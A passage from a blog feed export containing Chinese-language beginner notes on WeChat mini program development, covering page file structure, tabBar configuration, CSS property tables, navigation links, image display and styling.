class="title function_">setData</span>(&#123;</span><br><span class="line">        <span class="attr">bgcolor</span>: <span class="string">&quot;#f8ce5f&quot;</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">data</span>:&#123;<span class="attr">bgcolor</span>: <span class="string">&quot;#000000&quot;</span>&#125;</span><br></pre></td></tr></table></figure><h2 id="0x22-响应的布尔操作"><a href="#0x22-响应的布尔操作" class="headerlink" title="0x22 响应的布尔操作"></a>0x22 响应的布尔操作</h2><p>有些组件的私有属性的数据类型为Boolean布尔值，比如视频、Swiper轮播组件是否自动播放、是否轮播，视频组件是否显示播放按钮等等，这些我们都可以使用setData将true改为false，false改为true来达到控制的目的。</p><p>在交互方面，响应的布尔操作可以用于单一属性true与false的切换，比如显示与隐藏、展开与折叠、聚焦与失焦、选中与不选中。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">id</span>=<span class="string">&quot;daxueVideo&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://wxsnsdy.tc.qq.com/105/20210/snsdyvideodownload?filekey=30280201010421301f0201690402534804102ca905ce620b1241b726bc41dcff44e00204012882540400&amp;bizid=1023&amp;hy=SH&amp;fileparam=302c020101042530230204136ffd93020457e3c4ff02024ef202031e8d7f02030f42400204045a320a0201000400&quot;</span> <span class="attr">autoplay</span> <span class="attr">loop</span> <span class="attr">muted</span>=<span class="string">&quot;&#123;&#123;muted&#125;&#125;&quot;</span> <span class="attr">initial-time</span>=<span class="string">&quot;100&quot;</span> <span class="attr">controls</span> <span class="attr">event-model</span>=<span class="string">&quot;bubble&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">bindtap</span>=<span class="string">&quot;changeMuted&quot;</span>&gt;</span>静音和取消静音<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Introduction to Mini Program Development[1]</title>
      <link href="/2020/03/20/Introduction-to-Mini-Program-Development/"/>
      <url>/2020/03/20/Introduction-to-Mini-Program-Development/</url>
      
        <content type="html"><![CDATA[<p>腾讯校园技术布道师</p><h1 id="小程序开发入门"><a href="#小程序开发入门" class="headerlink" title="小程序开发入门"></a>小程序开发入门</h1><h2 id="0x01-文件结构与页面组成"><a href="#0x01-文件结构与页面组成" class="headerlink" title="0x01 文件结构与页面组成"></a>0x01 文件结构与页面组成</h2><h3 id="0x001-小程序的页面组成"><a href="#0x001-小程序的页面组成" class="headerlink" title="0x001 小程序的页面组成"></a>0x001 小程序的页面组成</h3><p>在每一个页面文件夹里都有<strong>四个文件</strong>，这四个文件的名称都是一样的，它们分别为：</p><ul><li><strong>json文件</strong>，和上面的app.json作用基本相同，只是app.json控制的是整个小程序的设置，而页面的json文件只控制单个页面的配置（因为有时候全局配置就够用了，所以页面配置有时候是空的）；</li><li><strong>wxml文件</strong>，小程序的页面结构，文字、图片、音乐、视频、地图、轮播等组件都会放在这里；</li><li><strong>wxss文件</strong>，小程序的页面样式，和app.wxss一样是控制样式，而页面的wxss文件是控制单个页面的样式；</li><li><strong>js文件</strong>，这个是控制小程序页面的逻辑（这个可以先放着，不用管）</li></ul><h3 id="0x002-pages"><a href="#0x002-pages" class="headerlink" title="0x002 pages"></a>0x002 pages</h3><p>用于指定小程序由哪些页面组成，每一项都对应一个页面的 路径（含文件名） 信息。文件名不需要写文件后缀，框架会自动去寻找对于位置的 <code>.json</code>, <code>.js</code>, <code>.wxml</code>, <code>.wxss</code> 四个文件进行处理。</p><p><strong>数组的第一项代表小程序的初始页面（首页）。小程序中新增&#x2F;减少页面，都需要对 pages 数组进行修改。</strong></p><p>如开发目录为：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">├── app.js</span><br><span class="line">├── app.json</span><br><span class="line">├── app.wxss</span><br><span class="line">├── pages</span><br><span class="line">│   │── index</span><br><span class="line">│   │   ├── index.wxml</span><br><span class="line">│   │   ├── index.js</span><br><span class="line">│   │   ├── index.json</span><br><span class="line">│   │   └── index.wxss</span><br><span class="line">│   └── logs</span><br><span class="line">│       ├── logs.wxml</span><br><span class="line">│       └── logs.js</span><br><span class="line">└── utils</span><br></pre></td></tr></table></figure><p>则需要在 app.json 中写</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;pages&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;pages/index/index&quot;</span><span class="punctuation">,</span><span class="string">&quot;pages/logs/logs&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="0x003-字体属性"><a href="#0x003-字体属性" class="headerlink" title="0x003 字体属性"></a>0x003 字体属性</h3><table><thead><tr><th align="center">字体属性</th><th></th></tr></thead><tbody><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_font_font-family.asp">font-family</a></td><td>规定文本的字体系列。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_font_font-size.asp">font-size</a></td><td>规定文本的字体尺寸。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_font_weight.asp">font-weight</a></td><td>规定字体的粗细。</td></tr><tr><td align="center">文本属性</td><td></td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_text_color.asp">color</a></td><td>设置文本的颜色。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_dim_line-height.asp">line-height</a></td><td>设置行高。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_text_text-align.asp">text-align</a></td><td>规定文本的水平对齐方式。</td></tr></tbody></table><h3 id="0x004-边框属性"><a href="#0x004-边框属性" class="headerlink" title="0x004 边框属性"></a>0x004 边框属性</h3><table><thead><tr><th align="center">内边距属性</th><th></th></tr></thead><tbody><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_font_font-family.asp">padding</a></td><td>在一个声明中设置所有内边距属性。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_font_font-size.asp">padding-top</a></td><td>设置元素的上内边距。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_font_weight.asp">padding-right</a></td><td>设置元素的右内边距。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_font_weight.asp">padding-bottom</a></td><td>设置元素的下内边距。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_font_weight.asp">padding-left</a></td><td>设置元素的左内边距。</td></tr><tr><td align="center">外边距属性</td><td></td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_margin.asp">margin</a></td><td>在一个声明中设置所有外边距属性。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_margin-top.asp">margin-top</a></td><td>设置元素的上外边距。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_margin-right.asp">margin-right</a></td><td>设置元素的右外边距</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_margin-bottom.asp">margin-bottom</a></td><td>设置元素的下外边距。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_margin-left.asp">margin-left</a></td><td>设置元素的左外边距。</td></tr><tr><td align="center">边框属性</td><td></td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_border.asp">border</a></td><td>在一个声明中设置所有的边框属性。比如border:1px solid #ccc;</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_border-top.asp">border-top</a></td><td>在一个声明中设置所有的上边框属性。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_border-right.asp">border-right</a></td><td>在一个声明中设置所有的右边框属性。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_border-bottom.asp">border-bottom</a></td><td>在一个声明中设置所有的下边框属性。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_border-left.asp">border-left</a></td><td>在一个声明中设置所有的左边框属性。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_border-width.asp">border-width</a></td><td>设置四条边框的宽度。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_border-style.asp">border-style</a></td><td>设置四条边框的样式。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_border-color.asp">border-color</a></td><td>设置四条边框的颜色。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_border-radius.asp">border-radius</a></td><td>简写属性，设置所有四个 border-*-radius 属性。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_box-shadow.asp">box-shadow</a></td><td>向方框添加一个或多个阴影。</td></tr></tbody></table><p><code>padding</code>设置内边距属性</p><p>代码执行顺序上、右、下、左<code>padding-top,padding-right,padding-bottom.padding-left</code></p><p>嵌入小程序底标，先新建图标文件价，放入图标，在app.json中引入</p><h3 id="0x005-icon资源"><a href="#0x005-icon资源" class="headerlink" title="0x005 icon资源"></a>0x005 icon资源</h3><p><a href="http://www.iconfont.cn/">iconfont阿里巴巴矢量图标库</a></p><h3 id="0x006-tabBar"><a href="#0x006-tabBar" class="headerlink" title="0x006 tabBar"></a>0x006 tabBar</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;tabBar&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#7A7E83&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;selectedColor&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#13227a&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;backgroundColor&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#ffffff&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;list&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;pagePath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;pages/home/home&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;iconPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;image/icon-tab1.png&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;selectedIconPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;image/icon-tab1.png&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;首页&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;pagePath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;pages/gradient/gradient&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;iconPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;image/icon-tab2.png&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;selectedIconPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;image/icon-tab2.png&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;座位&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;pagePath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;pages/list/list&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;iconPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;image/icon-tab1-active.png&quot;</span><span class="punctuation">,</span><span class="comment">//点击前的图标</span></span><br><span class="line">                <span class="attr">&quot;selectedIconPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;image/icon-tab1-active.png&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;个人&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;pagePath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;pages/more/more&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;iconPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;image/icon-tab4.png&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;selectedIconPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;image/icon-tab4-active.png&quot;</span><span class="punctuation">,</span><span class="comment">//点击后的图标</span></span><br><span class="line">                <span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;更多&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>这里有一个比较重要的属性就是list，它是一个<strong>数组</strong>，决定了tabBar上面的文字、icon、以及点击之后的跳转链接。</p><ul><li>pagePath<strong>必须为</strong>我们在pages配置项里建好的页面</li><li>text是tab按钮上的文字</li><li>iconPath、selectedIconPath分别为没有选中时的图片路径和选中时的图片路径。</li></ul><h2 id="0x02-WXML与WXSS"><a href="#0x02-WXML与WXSS" class="headerlink" title="0x02 WXML与WXSS"></a>0x02 WXML与WXSS</h2><h3 id="0x001-字体与文本属性"><a href="#0x001-字体与文本属性" class="headerlink" title="0x001 字体与文本属性"></a>0x001 字体与文本属性</h3><table><thead><tr><th align="center">字体属性</th><th></th></tr></thead><tbody><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_font_font-family.asp">font-family</a></td><td>规定文本的字体系列。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_font_font-size.asp">font-size</a></td><td>规定文本的字体尺寸。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_font_weight.asp">font-weight</a></td><td>规定字体的粗细。</td></tr><tr><td align="center">文本属性</td><td></td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_text_color.asp">color</a></td><td>设置文本的颜色。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_dim_line-height.asp">line-height</a></td><td>设置行高。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_text_text-align.asp">text-align</a></td><td>规定文本的水平对齐方式。</td></tr></tbody></table><h3 id="0x002-盒模型属性"><a href="#0x002-盒模型属性" class="headerlink" title="0x002 盒模型属性"></a>0x002 盒模型属性</h3><table><thead><tr><th align="center">内边距属性</th><th></th></tr></thead><tbody><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_font_font-family.asp">padding</a></td><td>在一个声明中设置所有内边距属性。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_font_font-size.asp">padding-top</a></td><td>设置元素的上内边距。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_font_weight.asp">padding-right</a></td><td>设置元素的右内边距。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_font_weight.asp">padding-bottom</a></td><td>设置元素的下内边距。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_font_weight.asp">padding-left</a></td><td>设置元素的左内边距。</td></tr><tr><td align="center">外边距属性</td><td></td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_margin.asp">margin</a></td><td>在一个声明中设置所有外边距属性。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_margin-top.asp">margin-top</a></td><td>设置元素的上外边距。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_margin-right.asp">margin-right</a></td><td>设置元素的右外边距</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_margin-bottom.asp">margin-bottom</a></td><td>设置元素的下外边距。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_margin-left.asp">margin-left</a></td><td>设置元素的左外边距。</td></tr><tr><td align="center">边框属性</td><td></td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_border.asp">border</a></td><td>在一个声明中设置所有的边框属性。比如border:1px solid #ccc;</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_border-top.asp">border-top</a></td><td>在一个声明中设置所有的上边框属性。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_border-right.asp">border-right</a></td><td>在一个声明中设置所有的右边框属性。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_border-bottom.asp">border-bottom</a></td><td>在一个声明中设置所有的下边框属性。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_border-left.asp">border-left</a></td><td>在一个声明中设置所有的左边框属性。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_border-width.asp">border-width</a></td><td>设置四条边框的宽度。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_border-style.asp">border-style</a></td><td>设置四条边框的样式。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_border-color.asp">border-color</a></td><td>设置四条边框的颜色。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_border-radius.asp">border-radius</a></td><td>简写属性，设置所有四个 border-*-radius 属性。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_box-shadow.asp">box-shadow</a></td><td>向方框添加一个或多个阴影。</td></tr></tbody></table><h2 id="0x03-链接与图片"><a href="#0x03-链接与图片" class="headerlink" title="0x03 链接与图片"></a>0x03 链接与图片</h2><h3 id="0x001-navigator组件"><a href="#0x001-navigator组件" class="headerlink" title="0x001 navigator组件"></a>0x001 navigator组件</h3><p>为了让二级页面与tabBar的页面有更加清晰的结构关系，我们可以在tabBar对应的页面文件夹下面新建要跳转的页面。比如我们的第一个tabBar是home，凡是home会跳转的二级页面，我们都建在home文件夹里。</p><p>新建一个页面imgshow</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;index-link&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">navigator</span> <span class="attr">url</span>=<span class="string">&quot;./../home/imgshow/imgshow&quot;</span> <span class="attr">class</span>=<span class="string">&quot;item-link&quot;</span>&gt;</span>让小程序显示图片<span class="tag">&lt;/<span class="name">navigator</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.item-link</span>&#123;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">20px</span>;</span><br><span class="line">  <span class="attribute">padding</span>:<span class="number">10px</span> <span class="number">15px</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#4ea6ec</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#fff</span>;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">4px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>链接内容可以是绝对路径也可以是相对路径</p><h3 id="0x002-相对路径与绝对路径"><a href="#0x002-相对路径与绝对路径" class="headerlink" title="0x002 相对路径与绝对路径"></a>0x002 相对路径与绝对路径</h3><p><strong>相对路径</strong></p><p>大家注意我们之前使用的路径基本都是相对路径，相对路径使用“&#x2F;”字符作为目录的分隔字符，</p><ul><li>“.&#x2F;“ 代表当前目录</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;./img/icon.jpg&quot; /&gt;等同于&lt;img src=&quot;img/icon.jpg&quot; /&gt;</span><br></pre></td></tr></table></figure><ul><li><p>“..&#x2F;” 代表上一级目录</p></li><li><p>“&#x2F;“  <strong>当前根目录</strong>，是相对目录；</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;/img/icon.jpg&quot; /&gt;</span><br></pre></td></tr></table></figure><p><strong>绝对路径</strong></p><p>网络链接就是绝对路径，还有C:*Windows*\System32，这种从<strong>盘符开始</strong>的路径也是绝对路径。通常相对路径用的会比较多一些。</p><h3 id="0x003-云存储"><a href="#0x003-云存储" class="headerlink" title="0x003 云存储"></a>0x003 云存储</h3><p><strong>免费的图床：</strong><a href="https://cloud.tencent.com/login">腾讯云对象存储COS</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;imglist&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">image</span> <span class="attr">class</span>=<span class="string">&quot;imgitem&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://hackwork.oss-cn-shanghai.aliyuncs.com/lesson/weapp/4/weapp.jpg&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="0x004-尺寸单位rpx"><a href="#0x004-尺寸单位rpx" class="headerlink" title="0x004 尺寸单位rpx"></a>0x004 尺寸单位rpx</h3><p>所有的手机屏幕的宽度都为750rpx</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.imglist</span> <span class="selector-class">.imgitem</span>&#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">700</span>rpx;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">415</span>rpx;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">20</span>rpx;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x005-图片的裁剪"><a href="#0x005-图片的裁剪" class="headerlink" title="0x005 图片的裁剪"></a>0x005 图片的裁剪</h3><p>引入widthFix：<strong>宽度不变，高度自动变化，保持原图宽高比不变</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;imglist&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">image</span> <span class="attr">class</span>=<span class="string">&quot;imgitem&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;widthFix&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://hackwork.oss-cn-shanghai.aliyuncs.com/lesson/weapp/4/weapp.jpg&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.imglist</span> <span class="selector-class">.imgitem</span>&#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>希望图片全屏显示，但是设计师却只给图片预留了一个很小的高度，这样我们就必须对图片进行一定的裁剪了，我们可以在imgshow.wxml这样写。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;imglist&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">image</span> <span class="attr">class</span>=<span class="string">&quot;imgfull&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;center&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://tcb-1251009918.cos.ap-guangzhou.myqcloud.com/background.png&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.imglist .imgfull&#123;</span><br><span class="line">  width: 100%;</span><br><span class="line">  height: 100px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x006-背景属性"><a href="#0x006-背景属性" class="headerlink" title="0x006 背景属性"></a>0x006 背景属性</h3><table><thead><tr><th align="center">背景属性</th><th></th></tr></thead><tbody><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_background.asp">background</a></td><td>在一个声明中设置所有的背景属性。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_background-color.asp">background-color</a></td><td>设置元素的背景颜色。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_background-image.asp">background-image</a></td><td>设置元素的背景图像。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_background-size.asp">background-size</a></td><td>规定背景图片的尺寸。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_background-repeat.asp">background-repeat</a></td><td>设置是否及如何重复背景图像。</td></tr></tbody></table><p>给id为wxmlinfo的view组件加一个背景颜色以及id为studyweapp的view组件添加一个背景图片：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#wxmlinfo</span>&#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#dae7d9</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#studyweapp</span>&#123;</span><br><span class="line">  <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">https://hackwork.oss-cn-shanghai.aliyuncs.com/lesson/weapp/4/bg.png</span>);</span><br><span class="line">  <span class="attribute">background-size</span>: cover;</span><br><span class="line">  <span class="attribute">background-repeat</span>: no-repeat;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写在wxss里的图片只能来自服务器或者图床，不能放在小程序的文件结构里，这是小程序的一个规定。</p><h3 id="0x007-图片的边框美化"><a href="#0x007-图片的边框美化" class="headerlink" title="0x007 图片的边框美化"></a>0x007 图片的边框美化</h3><p>圆角和阴影样式</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.imglist</span> <span class="selector-class">.img</span>&#123;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">8px</span>;</span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="number">5px</span> <span class="number">8px</span> <span class="number">30px</span> <span class="built_in">rgba</span>(<span class="number">53</span>,<span class="number">178</span>,<span class="number">225</span>,<span class="number">0.26</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>border-radius为图片圆角设置</p><p>box-shadow为图片增加阴影</p><p>把图片做成圆形</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span 